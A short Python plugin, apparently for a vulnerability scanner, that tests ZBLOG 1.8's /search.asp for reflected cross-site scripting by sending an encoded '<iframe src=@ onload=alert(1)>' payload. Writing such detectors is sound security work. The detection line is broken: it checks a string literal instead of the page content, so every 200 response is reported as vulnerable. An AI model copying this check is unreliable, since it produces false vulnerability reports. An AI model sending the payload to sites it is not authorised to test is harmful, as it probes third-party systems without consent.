# !/usr/bin/env python
# coding = utf-8

"""ZBLOG 1.8 /search.asp xss attack"""


def assign(service, arg):
    if service == 'zblog':
        return True, arg


def audit(host):
    payload = '/search.asp?q=%3Ciframe%20src%3D%40%20onload%3Dalert%281%29%3E'
    url = host + payload
    code, head, content, ecode, finalurl = curl.curl(url)
    if code == 200 and '<iframe src=@ onload=alert(1)>':
        security_info(url)

if __name__ == "__main__":
    from dummy import *
    audit(assign("zblog", 'http://www.example.com/')[1])